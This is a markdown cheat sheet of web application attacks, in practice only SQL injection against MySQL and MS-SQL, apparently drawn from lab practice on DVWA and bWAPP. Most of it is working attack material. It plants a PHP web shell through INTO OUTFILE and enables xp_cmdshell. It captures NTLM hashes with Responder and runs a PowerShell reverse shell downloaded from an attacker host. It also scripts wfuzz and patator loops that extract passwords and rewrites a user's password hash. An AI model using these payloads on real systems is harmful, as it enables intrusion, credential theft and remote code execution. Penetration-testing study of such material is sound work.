# Web Application Attacks
1. SQL Injection
2. Blind SQL Injection
3. Local File Inclusion
4. Command Injection
5. LDAP Injection 
6. XSS (TBD)

## SQL Injection

### Manual Testing 
Test characters and strings

```bash
'                       # a single quote, treated as a string terminator
;                       # a semi-colon, treated as a query terminator
#                       # a comment, comments out anything that comes after that character in that line
-- -                    # a comment, same as above
/**/                    # a comment, starts with /* , ends with */ , and can contain anything in between 
AND 1=1                 # an AND statement, 1=1 tests for true condition. Use 1=2 to test for false conditions
OR 1=1                  # an OR statement, 1=1 tests for true condition, use 1=2 to test for false condition
sleep(5)                # delays the response by the number of seconds mentioned in the sleep command. 
```
Let's combine the terminators and comment characters above.

```bash
'                       # Try a single quote only to see any error, because of string termination  
';                      # Try a single quote and semi-colon to see any error, because of query termination
';-- -                  # Try a single quote and semi-colon and comment after the character to see if this succeeds. 
AND 1 = 1               # Try AND tru statement to see any error or success 
OR 1 = 1                # Try OR statement to see any error or success
' AND 1=1;-- -          # Try adding AND condition to see if this succeeds.  
' OR 1=1; -- -          # Try adding OR condition to see if this succeeds. 
1 and sleep(5)          # Try adding AND operator, sleep command to look at the time to get the response back
1' and sleep(5);-- -    # Try adding AND operator, sleep command plus string terminator, query terminator, and comment
```

Use OR statement to get all data from this vulnerability

```bash 
# Try to add a single quote as a string terminator to terminate the original query and add OR Statement for true condition. 
' OR '1'='1    
' OR 1=1 # 
' OR 1=1 -- -
```

### Exploitation - UNION based Attack 
The ORDER BY is used to enumerate the number of columns for UNION based SQL Injection attack.
 
```bash
order by 1
order by 1,2
order by 1,2,3
... (Until you see some column error)

' order by 1-- -
' order by 1,2-- -
' order by 1,2,3-- -
...(Until you see some column error)

There are some variations 
' order by 1 -- -
' order by 1;-- -
' order by 1# 
' order by 1;# 

``` 

Once you see the number of teh columns, you can construct UNION based query using the number of columns. In this case, the number of the columns are 2. 
```
UNION SELECT 1,2-- -
UNION SELECT 1,2;-- -
' UNION SELECT 1,2-- -
' UNION SELECT 1,2;-- -
```

####  MySQL UNION Query 
Let's explore UNION clause to create your SQL Injection query on MySQL database. 

```bash
https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/

# @@Version
UNION SELECT 1,@@version-- -

# user() 
UNION SELECT 1,user()-- -

# table_name from information_schema.tables
UNION SELECT 1,table_name from information_schema.tables-- -
UNION SELECT 1,table_name,3 from information_schema.tables-- -

# column_name from information_schema.columns where table_name='<table name>'
UNION SELECT 1,column_name from information_schema.columns where table_name='users'-- -
UNION SELECT 1,column_name,3,4,5 from information_schema.columns where table_name='users'-- - # In case for 5 columns

# select <column name> from <table names>
UNION SELECT 1, username from users-- -
UNION SELECT 1, username, password from users-- -

# --- MySQL Code Execution Command - Ensure you know a file path --- 

# Browser
http://192.168.128.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'-- -
http://192.168.128.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE  "/var/www/html/backdoor.php"-- -
# http://192.168.128.10/backdoor.php?cmd=ipconfig 
	
# BURP (URL should be encoded)
POST /issue/checkByPriority?priority=Normal' union all select "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/srv/http/backdoor.php'-- -
```

####  MS-SQL UNION Query 
Let's explore UNION clause to create your SQL Injection query on MS-SQL database. 

```bash
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/

' ORDER by 1 -- -
' ORDER by 2 -- -
...
' UNION ALL select 1 --
' UNION ALL select 2 --
...
' UNION ALL select 1 -- 
' UNION ALL select 1,2 -- 
...

# Check the table format 
' union select 1,2 from master..sysdatabases -- -
' union select Null,Null from master..sysdatabases -- -

# Check the version number
' union select @@version,2 -- -

# Current User
' union select CURRENT_USER,2 from master..sysdatabases -- -

# Database name(s)
' union select name,2 from master..sysdatabases -- -

# Tables name(s) (with music database)
' union SELECT name,2 FROM music..sysobjects WHERE xtype = 'U' -- -

# Column name(s) (with users table)
'union SELECT name,2 FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users') -- -

# Data in the Column
' union SELECT name, 2 from users -- -   # with column name "name" 
' union SELECT  pass, 2 from users -- -  # with column name "pass" 

# ---- MS-SQL Code Execution Command

' union SELECT  pass, 1 from users; EXEC sp_configure 'show advanced options',1 -- -
' union SELECT  pass, 1 from users; RECONFIGURE -- -
' union SELECT  pass, 1 from users; EXEC sp_configure 'xp_cmdshell',1 -- -
' union SELECT  pass, 1 from users; RECONFIGURE -- -

# @Kali

sudo tcpdump -I tun0 
' union SELECT  pass, 1 from users; EXEC master.dbo.xp_cmdshell 'ping -n 5 192.168.119.128'-- -

# Obtain a NTLM hash

sudo responder -I tun0
' OR 1=1 ; exec master.dbo.xp_dirtree '\\192.168.49.239\test';--

# If you do not get the hash, try 
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .
' OR 1=1 ; exec master.dbo.xp_dirtree '\\192.168.49.239\test';--

# Powershell based reverse shell
cp /opt/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 shell.ps1

# At the end of the powershell code, add the following: 
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.128 -Port 1234

sudo python3 -m http.server 80
	
nc -nvlp 1236
' union SELECT  pass, 1 from users; EXEC master.dbo.xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('http://192.168.119.128/shell.ps1')"-- -
```

## Blind SQL Injection 
### Boolean based on MySQL  
This technique is very useful when the tester finds a Blind SQL Injection situation in which nothing is known on the outcome of an operation. The most important element of Boolean based attacks is <b>AND</b>, because it only gives a true answer in case that both sides of the operator are true. 

```bash

# Try the following query first 
AND 1=1 #      
AND 1=1 -- - 
' AND 1=1 #      
' AND 1=1 -- - 

# Try the following query instead, since you will need some successful query.
' AND 1=1 #
' AND 1=1 -- -

?id=1' AND 1=1 #
?id=1' AND 1=1 -- -
# You should see the successful query and response. 


# Check database version number
1' and substring(@@version,1,1)=4-- -
1' and substring(@@version,1,1)=5-- -
# This will tell you the version number of database with the successful query.
# We use substring(string, position, length) function. 


# Check the length of database name

1' and length(database())=<num> -- - 
1' and length(database())=1 -- - 
...
# patator
/opt/fuzz/patator/patator.py http_fuzz url="https://10.0.0.252/vulnerabilities/sqli_blind/?id=1' and length(database())='RANGE0&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=kjtjmhgjucv7tj5med9so25cu1; security=low" 0="int:1-10" -x ignore:clen=4361
/opt/fuzz/patator/patator.py http_fuzz url="http://127.0.0.1/vulnerabilities/sqli_blind/?id=1' and length(database())='RANGE0&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=jvvu7k4v0pj33l3ptijc3m3dn5; security=low" 0="int:1-10" -x ignore:fgrep="User ID is MISSING from the database."
# Adjust the number of length (currently 10)


#Check how many tables exists in the database

1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 -- -

# Check database name

1' AND ascii(substr(database(),1,1))>90 -- -
1' AND ascii(substr(database(),1,1))=100 -- -
...
# wfuzz
for i in $(seq 1 10); do wfuzz -c -z range,32-127 -b PHPSESSID=kjtjmhgjucv7tj5med9so25cu1 -b security=low --hw=901 "https://10.0.0.252/vulnerabilities/sqli/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ-- -&Submit=Submit#" | grep 218 | cut -d "\"" -f 2 | awk '{printf("%c",$1)}' ; done

# patator
/opt/fuzz/patator/patator.py http_fuzz url="https://10.0.0.252/vulnerabilities/sqli_blind/?id=1' and ascii(substring(database(),RANGE0,1))='RANGE1&Submit=Submit#" method="GET" header="Cookie:PHPSESSID=kjtjmhgjucv7tj5med9so25cu1; security=low" 0="int:1-4" 1="int:1-256" -x ignore:clen=4361 -l ./patator
cd patator
cat RESULTS.csv | grep 200 | cut -d "," -f 6 | sed -e s/\"//g | sort | cut -d ":" -f 2 |  awk '{printf("%c",$1)}'


# Check if the table, 'users' exists in current database

1' and (select count(*) from information_schema.tables where table_schema=database() and table_name='users')=1 -- -

 
#C heck all table names in current database

# wfuzz
for j in $(seq 0 10); do for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=901 -b PHPSESSID=kjtjmhgjucv7tj5med9so25cu1 -b security=low "https://10.0.0.252/vulnerabilities/sqli/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit $j,1),$i,1)))=FUZZ-- -&Submit=Submit#" | grep 218 | cut -d "\"" -f 2 | awk '{printf("%c",$1)}';done; echo ""; done
# adjust the number of characters in each table name (currently 10)

# patator
/opt/fuzz/patator/patator.py  http_fuzz url="http://10.0.0.252/vulnerabilities/sqli_blind/?id=1' and ascii(substring((SELECT table_name from information_schema.tables where table_schema='dvwa' LIMIT 1 OFFSET RANGE0),RANGE1,1))='RANGE2&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=kjtjmhgjucv7tj5med9so25cu1; security=low" 0="int:0-1" 1="int:1-20" 2="int:1-256" -x ignore:clen=4361 -l ./patator
# adjust the number of table to find (currently 2) and the number of characters in each table name (currently 20)
cd patator
for i in {0..5}; do cat RESULTS.csv | grep 200 | cut -d "," -f 6 | sed -e s/\"//g | awk '{ split ($1, a, ":"); if ((a[1]=='"$i"')) printf a[2]  ":" "%c\n",a[3]}' | sort -n | awk -F: '{printf $2}' ; echo "" ; done
# adjust the number of table names (currently 5) 


# Check the number of the columns under the table name 'users'

1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=6 -- - 

# patator
/opt/fuzz/patator/patator.py http_fuzz url="http://10.0.0.252/vulnerabilities/sqli_blind/?id=1' and (SELECT count(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users')='RANGE0&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=kjtjmhgjucv7tj5med9so25cu1; security=low" 0="int:1-10" -x ignore:clen=4361 -l ./patator
# adjust the number of column to find (currently 10) 


# Check if the column, 'user' exists in the table, 'users' or 'password'

1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='user')=1 #
1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='password')=1 #


# Check all column names under the table name 'users'

# wfuzz
for j in $(seq 0 10); do for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=901 -b PHPSESSID=kjtjmhgjucv7tj5med9so25cu1 -b security=low "https://10.0.0.252/vulnerabilities/sqli/?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit $j,1),$i,1)))=FUZZ-- -&Submit=Submit#" | grep 218 | cut -d "\"" -f 2 | awk '{printf("%c",$1)}';done; echo "";done

# patator
/opt/fuzz/patator/patator.py http_fuzz url="http://10.0.0.252/vulnerabilities/sqli_blind/?id=1' and ascii(substring((SELECT column_name from information_schema.columns where table_schema='dvwa' and table_name='users' LIMIT 1 OFFSET RANGE0),RANGE1,1))='RANGE2&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=kjtjmhgjucv7tj5med9so25cu1; security=low" 0="int:0-7" 1="int:1-20" 2="int:1-256"  -x ignore:clen=4361 -l ./patator
# adjust the number of columns to find (currently 7) and the number of characters in each column name (currently 20)
cd patator
for i in {0..5}; do cat RESULTS.csv | grep 200 | cut -d "," -f 6 | sed -e s/\"//g | awk '{ split ($1, a, ":"); if ((a[1]=='"$i"')) printf a[2]  ":" "%c\n",a[3]}' | sort -n | awk -F: '{printf $2}' ; echo "" ; done
# adjust the colum number (currently 5)


# Check the number of the data in one column 

# patator
/opt/fuzz/patator/patator.py http_fuzz url="http://10.0.0.252/vulnerabilities/sqli_blind/?id=1' and (SELECT count(first_name) from dvwa.users)='RANGE0&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=kjtjmhgjucv7tj5med9so25cu1; security=low" 0="int:1-10" -x ignore:clen=4361 -l ./patator
# adjust the number of column to find (currently 10) 


# Get the content from one column of one table.

# wfuzz
for j in $(seq 0 10); do for i in $(seq 1 50); do wfuzz -v -c -z range,32-127 --hw=901 -b PHPSESSID=kjtjmhgjucv7tj5med9so25cu1 -b security=low "https://10.0.0.252/vulnerabilities/sqli/?id=1' and (ascii(substr((select user_id from dvwa.users limit $j,1),$i,1)))=FUZZ-- -&Submit=Submit#"| grep 218 | cut -d "\"" -f 2 | awk '{printf("%c",$1)}';done; echo "";done

# patator
/opt/fuzz/patator/patator.py http_fuzz url="http://10.0.0.252/vulnerabilities/sqli_blind/?id=1' and ascii(substring((SELECT first_name from dvwa.users LIMIT 1 OFFSET RANGE0),RANGE1,1))='RANGE2&Submit=Submit#" method="GET" header="Cookie: PHPSESSID=kjtjmhgjucv7tj5med9so25cu1; security=low" 0="int:0-7" 1="int:1-50" 2="int:1-256" -x ignore:clen=4361 -l ./patator
# adjust the number of columns to find (currently 7) and the number of characters in each column name (currently 50)
cd patator
for i in {0..5}; do cat RESULTS.csv | grep 200 | cut -d "," -f 6 | sed -e s/\"//g | awk '{ split ($1, a, ":"); if ((a[1]=='"$i"')) printf a[2]  ":" "%c\n",a[3]}' | sort -n | awk -F: '{printf $2}' ; echo "" ; done
# adjust the number of the data (currently 5)

```

### Boolean based on MS-SQL
Adjust the queries and commands using https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/


### Time based on MySQL 

```bash 
1' AND sleep(5)-- -

# Get database name

1' and if((ascii(substr(database(),1,1)))>90, sleep(5), null) -- -
1' and if((ascii(substr(database(),1,1)))=100, sleep(5), null) -- -

for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 -t 1 -s 0 -b security_level=0 -b PHPSESSID=a7d5d5d0c6c7ec65991f61a575df7fd5 "http://192.168.142.147/bWAPP/sqli_15.php?title=iron man' and if((ascii(substr(database(),$i,1)))=FUZZ, sleep(10), null)-- -&action=search";done > database_name.txt && grep -e "0m10" -e "0m9" < database_name.txt | tr -s " " | cut -d " " -f 12 | sed 's/\"//g' | sed 's/\x1b\[[0-9;]*m//g' | awk '{printf("%c\n",$1)}'


# Get all table names

for j in $(seq 0 10); do echo "";for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 -b PHPSESSID=aab819dd0aa87d524125cc4b8eedf41d -b security_level=0 -t 1 "http://192.168.142.147/bWAPP/sqli_15.php?title=iron+man' and if((select ascii(substr(table_name,$i,1))from information_schema.tables where table_schema=database() limit $j,1)=FUZZ, sleep(10), null) -- -&action=search" ;done > alltablename.txt && grep -e "0m10" -e "0m9" < alltablename.txt | tr -s " " | cut -d " " -f 12 | sed 's/\"//g' | sed 's/\x1b\[[0-9;]*m//g' | awk '{printf("%c\n",$1)}';done


# Get all column names 

for j in $(seq 0 10); do echo "";for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 -b security_level=0 -b PHPSESSID=c24740571889cdb44015e89559806d00 -t 1 "http://192.168.142.147/bWAPP/sqli_15.php?title=iron man' and if((select ascii(substr(column_name,$i,1))from information_schema.columns where table_name='users' limit $j,1)=FUZZ, sleep(10), null)-- -&action=search";done > allcolumnname.txt && grep -e "0m10" -e "0m9" < allcolumnname.txt | tr -s " " | cut -d " " -f 12 | sed 's/\"//g' | sed 's/\x1b\[[0-9;]*m//g' | awk '{printf("%c\n",$1)}';done


# Get all content for a particular column

# Password
for j in $(seq 0 10); do echo "";for i in $(seq 1 50); do wfuzz -v -c -z range,32-127 -b security_level=0 -b PHPSESSID=c24740571889cdb44015e89559806d00 -t 1 "http://192.168.142.147/bWAPP/sqli_15.php?title=iron+man' and if(ascii(substr((select password from users limit $j,1),$i,1))=FUZZ, sleep(10), null)-- -&action=search";done > allpassword.txt && grep -e "0m10" -e "0m9" < allpassword.txt | tr -s " " | cut -d " " -f 12 | sed 's/\"//g' | sed 's/\x1b\[[0-9;]*m//g' | awk '{printf("%c\n",$1)}';done

# Login
for j in $(seq 0 10); do echo "";for i in $(seq 1 20); do wfuzz -v -c -z range,32-127 -b security_level=0 -b PHPSESSID=c24740571889cdb44015e89559806d00 -t 1 "http://192.168.142.147/bWAPP/sqli_15.php?title=iron+man' and if(ascii(substr((select login from users limit $j,1),$i,1))=FUZZ, sleep(10), null)-- -&action=search";done > login.txt && grep -e "0m10" -e "0m9" < login.txt | tr -s " " | cut -d " " -f 12 | sed 's/\"//g' | sed 's/\x1b\[[0-9;]*m//g' | awk '{printf("%c\n",$1)}';done

```

### Time based on MS-SQL

```bash

# Test Strings 

;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--


# Adding IF Statement 

'; IF (1=1) WAITFOR DELAY '0:0:10';--
'; IF (1=2) WAITFOR DELAY '0:0:10';--


# Check the database length

';IF (LEN(DB_NAME())>5) waitfor delay '0:0:5'-- 
';IF (LEN(DB_NAME())=5) waitfor delay '0:0:5'-- 

# Check the database name
# Check if a database named, butch exists. 
'; IF ((select count(name) from sys.databases where name = 'butch')=1) WAITFOR DELAY '0:0:5';-- -


# Check if a table name exists
'; IF ((select count(name) from sys.tables where name = 'user')=1) WAITFOR DELAY '0:0:10';--
'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--


# Check if a column exists from the table name 'users' 
# Original SQL: select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'user'

'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';--
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'password')=1) WAITFOR DELAY '0:0:10';--
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'password_hash')=1) WAITFOR DELAY '0:0:10';--


# Check if a colum starting with pass exists from the table name 'users'
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'pass%')=1) WAITFOR DELAY '0:0:10';--


# Check if you have a data (butch) from the username column in users table.
'; IF ((select count(username) from users where username = 'butch')=1) WAITFOR DELAY '0:0:10';--


# Update the password hash for the username 'butch' 
'; update users set password_hash = 'tacos123' where username = 'butch';--

echo -n 'tacos123' | md5sum
echo -n 'tacos123' | sha1sum
echo -n 'tacos123' | sha256sum

'; update users set password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb' where username = 'butch';--

```










